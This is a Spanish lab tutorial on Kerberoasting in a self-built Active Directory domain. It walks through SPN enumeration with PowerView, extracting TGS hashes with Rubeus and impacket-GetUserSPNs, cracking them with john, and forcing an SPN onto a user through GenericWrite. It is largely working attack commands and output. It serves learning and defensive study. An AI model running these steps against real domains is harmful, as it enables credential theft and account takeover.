---
icon: tickets-perforated
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# TGS-REP Roasting (Kerberoasting)

Esta tecnica consiste en obtener el `Ticket` de servicio del `Servidor` (`TGS`), para despues intentar `crackearlo` de forma offline, esto en un entorno real es posible ya que muchos servicios que estan creados por los `asministradores` y gestionados por ellos les suelen poner contraseñas debiles para que no se les olviden y es una practica muy comun, esta claro que los servicios que vienen por defecto no pasaria esto ya que vienen con contraseñas exageradamente largas, pero los creados por los `asministradores` si se podria porbar.

Antes de realizar la tecnica tendremos que identificar el `serviceprincipalname` de un equipo, en este caso lo haremos del `WS01` de la siguiente forma con `PowerView`:

```powershell
cd .\Desktop\
. .\new_powerview.ps1
Get-NetComputer -Identity WS01
```

Info:

```
logoncount                    : 47
badpasswordtime               : 01/01/1601 1:00:00
distinguishedname             : CN=WS01,CN=Computers,DC=corp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
displayname                   : WS01$
lastlogontimestamp            : 05/01/2025 19:05:38
objectsid                     : S-1-5-21-3352250647-938130414-2449934813-1106
samaccountname                : WS01$
localpolicyflags              : 0
lastlogon                     : 16/01/2025 9:22:00
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : WS01
accountexpires                : NEVER
whenchanged                   : 05/01/2025 18:05:38
instancetype                  : 4
usncreated                    : 16477
objectguid                    : 2dce0dd7-5b41-4809-adeb-8afb66039f26
operatingsystem               : Windows 10 Pro
operatingsystemversion        : 10.0 (19045)
lastlogoff                    : 01/01/1601 1:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=local
dscorepropagationdata         : {12/01/2025 16:31:12, 01/01/1601 0:00:01}
serviceprincipalname          : {RestrictedKrbHost/WS01, RestrictedKrbHost/WS01.corp.local, HOST/WS01,
                                HOST/WS01.corp.local}
ms-ds-creatorsid              : {1, 5, 0, 0...}
iscriticalsystemobject        : False
usnchanged                    : 16485
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 05/01/2025 18:05:38
primarygroupid                : 515
pwdlastset                    : 05/01/2025 19:05:38
msds-supportedencryptiontypes : 28
name                          : WS01
dnshostname                   : WS01.corp.local
```

De esta informacion nos quedamos con el `serviceprincipalname` ya que es el que nos interesa para poder realizar la tecnica de `kerberoasting`, pero todos los servicios que vemos que tienen asociados estan creados por defecto, por lo que tendran una clave muy larga asociada, por lo que vamos a simular que nosotros como `administradores` vamos a crear un nuevo servicio en nuestra infraestructura de la siguiente forma:

Nos iremos a nuestro `DC` -> `Servidor del Administrador` -> `Usuarios y equipos de Active Directory` -> `Users` -> `Crear usuario` -> ponemos como nombre `MailSrvc` (Ya que lo vamos a simular como si fuera servicio de correo electronico), en el nombre de inicio de sesion pondremos lo mismo `MailSrvc` -> `Siguiente` -> pondremos como contraseña `password` y marcaremos que la contraseña nunca expire -> `Siguiente` -> `Finalizar`

Con esto ya tendriamos el usuario de servicio creado correctamente.

Ahora si queremos asociarle un `serviceprincipalname` a esta cuenta de servicio en concreto uno de correo, podremos hacerlo de la siguiente forma.

Abriremos un `PowerShell` en el `DC` y pondremos lo siguiente:

```powershell
setspn -S MailSrvc/MS01.corp.local MailSrvc
```

Con la parte de `MailSrvc/MS01.corp.local` lo que le estamos indicando es que apunte al serivicio que este corriendo en el `MS01` que en nuestro caso no existe, pero si existiera tendria que ser donde este corriendo el serivicio, no pasa nada si no existe, se puede poner tambien. En la parte de `MailSrvc` le indicamos el nombre de usuario al que le queremos establecer todo lo anterior (El servicio).

Info:

```
Checking domain DC=corp,DC=local

Registering ServicePrincipalNames for CN=MailSrvc,CN=Users,DC=corp,DC=local
        MailSrvc/MS01.corp.local
Updated object
```

Y con esto veremos que lo habremos registrado correctamente.

Ahora si buscamos por `serviceprincipalname` con dicho usuario con el `PowerView` veremos lo siguiente:

```powershell
Get-NetUser -Identity MailSrvc
```

Info:

```
logoncount            : 0
badpasswordtime       : 01/01/1601 1:00:00
description           : Cuenta de servicio de correo.
distinguishedname     : CN=MailSrvc,CN=Users,DC=corp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : MailSrvc
userprincipalname     : MailSrvc@corp.local
name                  : MailSrvc
objectsid             : S-1-5-21-3352250647-938130414-2449934813-1223
samaccountname        : MailSrvc
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 16/01/2025 8:44:03
instancetype          : 4
objectguid            : e7a5c6b4-1c22-48a4-9fc6-b5682ddff948
lastlogon             : 01/01/1601 1:00:00
lastlogoff            : 01/01/1601 1:00:00
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=local
dscorepropagationdata : 01/01/1601 0:00:00
serviceprincipalname  : MailSrvc/MS01.corp.local
givenname             : MailSrvc
whencreated           : 16/01/2025 8:43:49
badpwdcount           : 0
cn                    : MailSrvc
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated            : 69685
primarygroupid        : 513
pwdlastset            : 16/01/2025 9:43:49
usnchanged            : 69692
```

Veremos que pone `MailSrvc/MS01.corp.local` en el `serviceprincipalname` por lo que esta todo correcto.

Para nosotros poder identificar los usuarios de servicio que hay en el dominio, podremos hacerlo con el siguiente comando:

```powershell
Get-NetUser -SPN
```

Info:

```
logoncount                    : 0
badpasswordtime               : 13/01/2025 8:11:48
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=corp,DC=local
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-3352250647-938130414-2449934813-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 05/01/2025 11:39:16
instancetype                  : 4
objectguid                    : 3e5f2afb-8433-4a2b-ad2b-e1f082a1352c
lastlogon                     : 01/01/1601 1:00:00
lastlogoff                    : 01/01/1601 1:00:00
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=local
dscorepropagationdata         : {12/01/2025 16:31:12, 05/01/2025 11:39:16, 05/01/2025 11:08:50, 01/01/1601 18:12:16}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local
whencreated                   : 05/01/2025 11:08:50
iscriticalsystemobject        : True
badpwdcount                   : 1
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 05/01/2025 12:08:50
msds-supportedencryptiontypes : 0
usnchanged                    : 16421

logoncount            : 0
badpasswordtime       : 01/01/1601 1:00:00
description           : Cuenta de servicio de correo.
distinguishedname     : CN=MailSrvc,CN=Users,DC=corp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : MailSrvc
userprincipalname     : MailSrvc@corp.local
name                  : MailSrvc
objectsid             : S-1-5-21-3352250647-938130414-2449934813-1223
samaccountname        : MailSrvc
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 16/01/2025 8:44:03
instancetype          : 4
objectguid            : e7a5c6b4-1c22-48a4-9fc6-b5682ddff948
lastlogon             : 01/01/1601 1:00:00
lastlogoff            : 01/01/1601 1:00:00
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=local
dscorepropagationdata : 01/01/1601 0:00:00
serviceprincipalname  : MailSrvc/MS01.corp.local
givenname             : MailSrvc
whencreated           : 16/01/2025 8:43:49
badpwdcount           : 0
cn                    : MailSrvc
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated            : 69685
primarygroupid        : 513
pwdlastset            : 16/01/2025 9:43:49
usnchanged            : 69692
```

Y vemos que nos saca 2 usuarios uno que esta por defecto que es el `krbtgt` y el otro que hemos creado que es el `MailSrvc`.

O si lo queremos ver filtrado con la informacion que realmente nos importa seria de la siguiente forma:

```powershell
Get-NetUser -SPN | select name,serviceprincipalname
```

Info:

```
name     serviceprincipalname
----     --------------------
krbtgt   kadmin/changepw
MailSrvc MailSrvc/MS01.corp.local
```

Lo que vamos hacer para realizar la tecnica sera solicitar el `Ticket-Granting Ticket` del `empleado1` y ya despues utilizarlo para obtener e interceptar el `Ticket` de servicio.

De primeras vamos a realizarlo con el `Rubeus.exe`.

```powershell
.\Rubeus.exe kerberoast
```

Info:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.local
[*] Searching path 'LDAP://DC01.corp.local/DC=corp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : MailSrvc
[*] DistinguishedName      : CN=MailSrvc,CN=Users,DC=corp,DC=local
[*] ServicePrincipalName   : MailSrvc/MS01.corp.local
[*] PwdLastSet             : 16/01/2025 9:43:49
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*MailSrvc$corp.local$MailSrvc/MS01.corp.local@corp.local*$6DB924F248
EE7DC8367BC6C91923FE50$E9FCAD72B5EE9CD24231CEA0084123D1B4E2AFC55E82467527557341A
F409E68CDB8965D6097E5849500EF747106124FC640DACE096929FFCAA02187CF675800735B3B3B8
B6AD24BF2534DDE5D0CBDC1E579F051A2EE74004EEBF7271112B44703783F06702708ADB3153AADB
F70CCCFBED393B92D675D3DE8797425414F1A4CD1F2477C577DB1578DA28CBA30ECCD26C72C9B908
7BA26E5ACEE1E2B69D635467F31014B14B0307B572E847358AED48C07A9864E0141FA33B698686F5
15341BBC412195020704BEE02D192A310D02A5AD3D20AB2F6E89E05BA0E9A6A88048829A0D8D56A3
107A462867A1F3D153212500C70E0ED8194052875F9346F52C7DE3663EC58A0ED327A199E75D31DE
9E5D237D3F3735694B303F0BAFFC96C3E5A20513DA2F70AA9C44387DC8266B500914A25698DD07CB
FDA67048264DC2115B29B407342C1D1AD43CB38E3B850DA322D903C3B1491875AC9970B7E8B78C32
899E768A324CB45E899D7F58207F3DF727669BC275482396519A5CBD3BB7D888BCE0620E22A01C5D
3AACD66F3581208EF7D4B1724FAD2B1D5536B694774B7311AE0EB57B89DB77F059BC75D0A8D33039
7D16CF5B0EB58FDAD9E2AA43622314B9CBB5D75F419644AC67F6195DFF2BFCD4C49080679EB1AF3C
E7E2E96CD44F37463756083FC1547B451A90002665AF3F839DD11FE906ADB968F021B1CC355D51FD
3410A0643717118384B5F218810A275C1A758F1829D4945BC54F183669BE45CF5C7BBD48416C0383
844CE0E0F2B8BE49A0D9C018FAE13E1F69769A1F2E4EEE89B9BC69418F665BE8AEB6EC5E16DB97B0
9C5A586F60314CE4D53F4A6F54DCC499DC8AD49545A1FA6F6F73BDB1F97576D8296D4A14F8EE614F
8490C7A0E5A50068E555834C365006D7B6885427EFCF88049C99602C4B712EDA317659B06E29A884
B3B6EEE0DFADE5F6128C59FF983A961E141092D7599FD244C69158D47E050DBA09679A16A568517F
90AC19F7603E525EF060F2BCD1F85123C7E54A9B31911737122EF5E4084AF17470E781AD6EA1295A
4DA81E1009BD5615BEB563753018CE22300FC2E488B1F715FCA9A764FC34BFB758C9CA0F0A2432E2
09AAD9EB254FE67E267DB1BDF2167D5233E6B09F91C0D5B7C10F6826E14C2BFCF41029B4E0CD3894
EED69D1D408CB8B7F0E494F18D91A76D87406E20883940258575AFA5ADC29D026A68DD9E6E91D779
DE3632AE1BBD41F39A15F360F417CD42C4C6E52584DBB30D09310D05017CEB73398913D975B0CB34
9551C5BFED7417A9A03F86D3B22E9CAAA1EE758A35CD4F0ACC19C90888C0F606C721811B719950D9
F7E13927F65A1C452058CB7D0A939E8EFB43A423B2C1582824F1017804CD08447773EA26014008C0
705EA283436B296C4C99D6F33E4DB8CC7248CD76F78E46170A8215CD8C55B1168E9442DE9F2FCEF0
9E4D9CE940B937EC70F8A28D27E27
```

Lo que hace esta herramienta de forma automatica es buscar las cuntas de servicio que ha creado el `Administrador` y dejar fuera las que vienen por defecto ya que son imposibles de `crackear`, por lo que nos ha sacado el de `MailSrvc`.

A nivel de red lo que ha echo la herramienta es que como `empleado1` que ya tenemo el `TGT` al iniciar sesion, es solicitar al `TGS` el `Ticket` de servicio de `MailSrvc` y este mismo le ha respondido con todo el proceso que ya vimos anteriormente, por lo que la herramienta captura ese `hash` del `Ticket` de servicio.

Y ya lo que podriamos intentar con esto seria `crackearlo` con `john` en nuestro `kali`.

Lo buento de esta tecnica es que nosotros no necesitamos tener ningun privilegio, ni tenemos que tener nada especial, solamente tener las credenciales de cualquier usuario y asi podremos obtenerlo de esta forma.

Ahora si nosotros quisieramos obtenerlo desde `kali` podremos hacerlo con la siguiente herramienta:

```shell
impacket-GetUserSPNs -dc-ip 192.168.5.5 corp.local/empleado1:Passw0rd2 -request
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
------------------------  --------  --------  --------------------------  ---------  ----------
MailSrvc/MS01.corp.local  MailSrvc            2025-01-16 03:43:49.829648  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*MailSrvc$CORP.LOCAL$corp.local/MailSrvc*$06345ac56b27d5a2130f1160db7439a9$b136b8c003324e7dd748f18e9695046d2169dfe4c11fb5c4b801853d3d6d72ea99aca2a6b3afdbab66e18b91d67cc4cf1eca1a03ccc401d37b9e7fa84e49a30ce55df3595bd4a0b5fad6143e47dec2135e7577d0628f26c252c485c459ea1b8378c6487ac1262d16360b352c4cc96121a7c320e3c06dc481ee83eadcdc4d49b34f4a075430d278d90c0a0495f2eaeb6f35513d7ddd0506c34d1cf42aa0f681d82abc27d133de95f1fb0009878c9e4a927e02638324777541529f739ceb1457aff8c48b873424bea5177803f1174de6977b20e94b49552c02df752a5f9d48100e0c35663ca3f86faacc0e9b8f69d803cb7a3503750913f30efd1f9297606d8dc2d91c2aef4c75cc93c6e02d19449abb7237b09e3ecc96ff3d39fdff7a81b37c090551002ddc02d2134152a6a991c7e576f2ac32ff9a8976072ccf43928393023672d8e494d19155ac8b912b063b09c1ecee24946eb12c6aeb7cabfa56ae4579c39a7d1fa89639ec3db3b35c0a9c93ad567a118ae906a6722e3b20d10fa52800664b72d7b3fb261a397e6de8541272bb056f76a07c8f3bdda7db6ebe2752bcdef2eb3680ef7d3fdfc78c50e39be5c64c85302fa22108c59818a00dddbace7657e88c3314d2aa851a2681d85131fddb078d98853aaca55cddeb5e483a75744b5ab173f8f2f821738c9a82554b472f162d84d6f0c3cfcacdbbffb43e2557a7354855dfd2693f273b97fc26a6315c21fd7fe8fa1af58f3358145b7f9f61652865e6e204fac15d0b55c8b4a06c4daaab03b7ea10e33dc1c169e3c7c4ede7049b4bd6ac5ab3096096910fa81f9f7be7cd9a14b6c8bbb9f31c69cca668dad65d33cf1ea627515566b8836f6512a17ee70a71f0f2ec66cdad350f58ee4ec933cd426fa0d44046c0c7ec752d2f6b52a48dfa18640797e68b3247714e63eb1b60ab3a0714a46f55648fb8391db35188cfbc5b278d64649bc9b73e614f40862fe3ec97660b563f74becf3f1f0848356ad8cc9a2161c0555a845ad7de07762387eee65530e679667bb6631a43789bf95180544ce24b05fcca13e9dade1901f59f1a98cc673a52c2f809a777fb918657ebe379de3b86380deb001a299b8fe79f2fd5fe009835ca91894bdc731207854d67607a443ea9c5d59887fc7a08d118e3f2f54589565dee74dcc55fc41550009ee5d3a67b0375fc3d1ab9489a50bbf7817d680bf1750bc86087123b41184c2035fe75b48a68cd69d11fa4eaf3be5704aa38517023322de7828a04ba7df230d408044729380519f3b4e4eb01450c54897b18537d1a6ccf5b6bda5bf7ec89f2792a
```

Si queremos volcarlo a un fichero para despues `crackearlo` lo haremos de la siguiente forma:

```shell
impacket-GetUserSPNs -dc-ip 192.168.5.5 corp.local/empleado1:Passw0rd2 -outputfile hash.tgsrep
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
------------------------  --------  --------  --------------------------  ---------  ----------
MailSrvc/MS01.corp.local  MailSrvc            2025-01-16 03:43:49.829648  <never>               



[-] CCache file is not found. Skipping...
```

Y con esto veremos que nos lo volco correctamente, si lo comprobamos:

```shell
cat hash.tgsrep
```

Info:

```
$krb5tgs$23$*MailSrvc$CORP.LOCAL$corp.local/MailSrvc*$74866dd35e9ba5d7fe10e2df5b44338d$a2aa8611d7af1368a9630d4f5dfb75c28d27a8519668f2574427c50c0fb474c7a66c064390b6e8253968e1938ac52e3c4804b45eaa20f119beb2dc9d999818e7a46b6422d9dfa36219f4b370fab0d86497a37bc5a6580329d6278a7b6d86a38e0553352bb9bf06c38f30d89560e4b79b86523789cf3d1b018851e46555f21d422644b91d86a865fcf59b21d363e1f0e82e4fc844da22c983a1c31f1f25bdf4f9129cb716c386d4dfedc0a7a733a0cc94acce5853974abd411bebc309b39210ef457b6ee1d3f3844e48fb7e6ce824fba85bc510003994110a647c8a255ac4b42038a55e8f479825fc4aa78a5f04a1bb7d7636df1c3ef898ac0e31265c7fef7e0d998bf118f8b8ff2b93254d21c3c154e412e91ef346bbe5ddfc4758e67e2b8b72da0d0bd2b6d56f0ef0b51222a78f36eca32b35b4e64490bf8ed461000ba78e894d1eaf6af0dfef4eb807940a6e72c9aa7a1a08100f2ec169eed9988e8bf6dae53616c9880d380309738e8f902d350aa8cc44fea006d118b3b94e34fa3f21ddc5bd97106b4bfe9154711103b68713090418771a1c3564de37762f4d11de999cfb1813807a7218f499f201dd35a0fa54ea17180fb8b13a756145bd365dba0a35b3f958c327845f6486fbe04e53bd669ac08c9c4b3b6cb41f1d7f46cbd7c7aca47746f5553f0ac7d3858e422c494fe7a5c85d8d2e94dcfd61b66d0d35fb519d38f65460d15fbbcc740e2fba3aec2bb4e4b88cf31b39e34e1371c54811cc662c590ca626f0435b49a01003a31493f0c622b7ee95a6e399b3abfb04b40b4c147a08379b9ccdcd0d588744bd674184f16ac3f9214edf12d243deb23bdf5992bd744097a5d522e2e16176bde465922b73eda287a88371f019d3ca326e037896dd206f047f3e2f563b6d4ab6ab80bfb01b315f5092bfc144207057dc061c978c35ca68131d42d7902fab5f96ecb4c2d6302de6b32bee0f0505eb29c405d8e54555800dd44f925c2578a88e1ec4bfdffbbbbee185fcae6e8563bac5ba3deb72789df839f2a433a5ae118e0537163ae46f9abb87d08f0c0fafcd0ba12c0b9d1904c354ce19cc625cadc8314c6f461bdf7820714549b2e591cbe7d07fb0d12127d403fc9dbe25e8c6d3eb8a8aeb53c45d83790f1976f6f45fc65466fa1b798cf043d486883873c71c477c23b59419a0836ce92870964126102d011233416f7e0f3e2824fb88837c9a0a1d495c1e97cee868194c22f8f43a8929e844ad1f1c1e16821a5eda20b25da6ed2950ddd3756465b1de6804583182607661c20264cb2cdfeeb41238b77641a53595cdf678bd
```

Por lo que vamos a intentar `crackearlo` con `john` de la siguiente forma:

```shell
john hash.tgsrep
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
password         (?)     
1g 0:00:00:00 DONE 2/3 (2025-01-16 04:10) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..random
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Y como vemos nos saca la contraseña.

### Forzar un Kerberoasting

En otro caso pongamos que no conseguimos `crackear` el de `MailSrvc`, si nosotros tenemos una `DACL` que nos permita escribir a un usuario en concreto o algunos usuarios dentro de un grupo o algunos de estos tipos, lo que podremos hacer sera asociar un `servicio` cualquiera que nos inventemos o que exista realmente para asi conseguir el `Ticket` de servicio del usuario que en realidad seria la contarseña del usuario para asi `crackearla` de forma offline, a esto se le llama `forzar` un `Kerberoasting`.

Las `ACLs` que puedem hacer esto anterior seria un `GenericWrite` o `GenericAll`.

Vamos a preparar un usuario para que tenga esa vulnerabilidad respecto al `empelado1` y podamos `forzar` un `kerberoasting`.

Nos iremos a nuestro `DC` -> `Servidor del Administrador` -> `Usuarios y equipos de Active Directory` -> `Users` -> seleccionamos uno cualquiera en mi caso sera el llamado `ali.alix` -> click derecho y `Propiedades` -> `Seguridad` -> `Opciones avanzadas` -> `Agregar` -> le damos a `Seleccionar una entidad de seguridad` ponemos `empleado1` -> `Aceptar` -> bajamos abajo del todo y pulsamos `Borrar todo` -> seleccinamos solamente la casilla llamada `Escribir todas las propiedades` (`GenericWrite`) -> `Aceptar` -> `Aplicar` -> `Aceptar`.

Una vez configurado todo esto haremos lo siguiente.

Imaginemos que ya hemos identificado que tenemos esa `DACL` respecto a dicho usuario, pues lo que haremos sera establecerle un `serviceprincipalname` para que sea reconocido como un usuario de servicio y `forzar` lo que queremos:

```powershell
Set-DomainObject -Identity ali.alix -Set @{serviceprincipalname='test/cualquiercosa'} -Verbose
```

Info:

```
DETALLADO: [Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=CORP,DC=LOCAL
DETALLADO: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=ali.alix)(name=ali.alix)(dnshostname=ali.alix))))
DETALLADO: [Set-DomainObject] Setting 'serviceprincipalname' to 'test/cualquiercosa' for object 'ali.alix'
```

Ahora si filtramos por los usuarios de servicio que haya en el dominio:

```powershell
Get-NetUser -SPN | select name,serviceprincipalname
```

Info:

```
name     serviceprincipalname
----     --------------------
krbtgt   kadmin/changepw
MailSrvc MailSrvc/MS01.corp.local
Ali Alix test/cualquiercosa
```

Vemos que ahora `ali.alix` se esta comportando como un usuario de servicio.

Ahora si nos volvemos a `kali` y volcamos los `tickets` de servicio de los usuarios de servicio haciendo un `kerberoasting` veremos lo siguiente:

```shell
impacket-GetUserSPNs -dc-ip 192.168.5.5 corp.local/empleado1:Passw0rd2 -outputfile hash2.tgsrep
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
------------------------  --------  --------  --------------------------  ---------  ----------
MailSrvc/MS01.corp.local  MailSrvc            2025-01-16 03:43:49.829648  <never>               
test/cualquiercosa        ali.alix            2025-01-11 10:09:54.602322  <never>
```

Vemos que ahora nos ha volcado tambien la clave del usuario `ali.alix` y si lo comprobamos en el archivo:

```shell
cat hash2.tgsrep
```

Info:

```
$krb5tgs$23$*MailSrvc$CORP.LOCAL$corp.local/MailSrvc*$0a807024c0b6efefe06c9f2daf9886b3$56d9f20971399c8df2937f0f03a472afec5f79e5316822c719706bd677a493c924fabf2e228086ac330590cb7fe3e7f03fd1f001000052a9a183e36b52bedec29fe5b204adb01da48f4e4ae5bd450850677d6cb2d6244f7fcf68186be9731eff19b456fe206ad92e1d79ec26846eaeaaa31f56c66c97404a81394bdaf7848e0919ca3554bc11e1443c7a3ee3e42dc06702ed810c75e3ad7cd5b0409bd46dd374cd60d7b168f441b7d4a5bab7b5cbebe6ba56ae120f1c1b4eee14cc0af77e3f31bdd4cba5c17cf0025d2c06eec070df929b21b6ff037fcca2acd1d7254ed159f31e747699321e6200d30f8084ce42c30cdd3703f003aa9d73303f96e5edbfc67673c6f8562aad3287665307e57934587f3d31069b2eab862c9fc9108d7adf1fe6a57a90202db1a7d52ad7e58b0ab1206e95c0299c7ffce82636db6f6669ea825fbc2f010270356020dc95f46406787116253a50d7f3174b69f1b962de6de4bef6c993128546bf53f168f9ea77dc541b1c8f17013888dd26e30f06de4a55bc4713aaec728f9ca54a6c2677400c470db47c3cd679c09168bf5f0c5386e54e67e50c8d85d123ce33c8c2493d6c227e4cd91ac96e16fc95e4b8b1dc665221130c30ba4c8f698af0180315e7f2f459b587674f0643be62113fd92cb65e5b986375f56476bde682fdb6eec618b58e7ed9b64afe8a5afc8c644c012962492b7b6ac8da87716d6ad76bedd6b9c510c92b8327af934714d46c5988148fc07a8bc8b05c53435445ab36cb4d14073f1e890b9a8b56cc691023a11ebd72564a3a5cf0e3a1dfc2640e1a68a6fdc2356a7132184292a11ffe8295149f758e5071f4ff9a2285a83ae9098e575df2bdf819926d1f7b95abd248207db2d5601e7aa36f4a1b37c230ea1372a62dd82afee07859f04e04db050d9b4b78bfa772d34dcc65d2b247d694408437ec4000587453acd1860c52f1affdfceb98e8af9f1a00a25b0825fb7962f046fca69a8b9c4c7d81d9b22cf450769b78a11e40a00ee0611e4284f6443f802584e06add8461e2b52ab645193dc93a1a98504343e3a1dfb37158f50871d6e14babf4c40b4b2f0c12664a984390d3dd3203ee87c42bc89d462cfdc932277777d9dbbed9bfb391623eec84b0f5e60c8d27060fd7e8970840627ca28286d4c420f51f4e7765c58d1364edfa39fcf182ad22ea9b0be6e55a47fa0fb4722722b4175aa579d273ec3884c3924a89cccaaa6c59ec3e8c8a5d0cdf31abe5b90484f6e55438b75b8c895376e7e525f18b451e590f59a045703b848a1aab2efa29368385f2165f92de49a39d7e5b
$krb5tgs$23$*ali.alix$CORP.LOCAL$corp.local/ali.alix*$45d93f64b570361f888258aedb383dd8$52065252211fc61ba8ff453017fffe745d1c088b7684285ad03fb46427bdfb1839aa48c38820bc53bd458e410549365a29a0797e91c5ee3bf037906aa9d5fe121964fb091e0c9ff9e6edd109da2ae8146621a83c63e60090183033055893ba252d89b587651886ae47aba9be2b309331dc3ef3d54de7d3b01e026a565fd089c8944f4798cfa77803959b0e9ed62f51d34bb7a1772d744865e278237e0cc576f5682993c6d6d6d696837c908aff96abe2cc248342f972504bd12b5ba4af841dc8a817735e612b7d011e5b3b3e1e607c75b6b063431b8113fec7f360c86f239f6df716f0bc7865fd350845e763449cbc5036dc6d4a7d72c7e91b7beff25794a127f51f5b222adb5bbe1a624965e2716207964dd3d43e1d76697f538ba5fdc44bcff6d1651efce2c47c2f61d6a6ef755e48164c7046935c722836b8c51b79c798ab427ca6db9f47b90d0f592cea56f10e42a80b464b2640a8a94cbb7cab756989a87c62082ee4996f499d24d2347a02e7373b8bb8dc8981bad9cfacaa4f5e650f28332acc6357682587150e3fc424f4b1597304f7d5648652c469753fd410445b4166ed835d720accae353a4fcf40bd30bcb0dbd2f39c80638b62b4336f903da5cef08ff297ab5c7f21200e9e352fef234e4a9daea1e99d7cca4536384e6724a6fb67db5c04d8dbe2005688127c2f22c2692442e0426164f43d877908b5e8b9bd7852f4596dcffe20b7cd3aa4cdcadc9157217d83cf02c9d2db3618541427b38cdd48ac51fa10d60cd31eb84f817cdd97f1f299af0b5f71da26166d73efdf8bdf806792feb0a3091bcd8ca825338af196cedd7ddbce9c8c43795022ec812706ea1ced06e507bdd88a03625649ba5d2f4e8e581ac4ab4556ec9ff92e355bf12aaa4004745e10ceec60661f45662c8cb5026383621fd62f5edade8836d6b188177cdd3001319846c697ba8ce27185f0e8a37b726a9914416ac12ac77d85a8b30ce2bd59801a0e0f2c1dac9edc7262c79c1b348fb669a6d77c0c4df8a2212b0f8e6b3ee9e62f22403211ebc1f9fa99d1fdc905e6bd632c8b3cc01c68f3805d0e6bff80111c553e037cf73382bfdc7d34c43779d03cea0f467773c2071746ccc4ca40068d82fc328291d17a9fe48734de603afcb68974ebe4d34bbca97b492ebf90d3766f45dbd20799d396fd3d50aaacf4d69e4cb0103c707ffd94f59d619bde4e8e75a1672bbaadb7b148cc4d8d776bd5fb8e5f90576af59307fffe6840643253acbf6985605faacf3d0aeed9b492b8c409a887f84cc49a7d0c83182e875e21d064a94e477421bde15d14dd
```

Vemos que efectivamenten tendremos el `hash` de la `clave privada` del usuario `ali.alix` por lo que podremos intentar `crackearlo`.
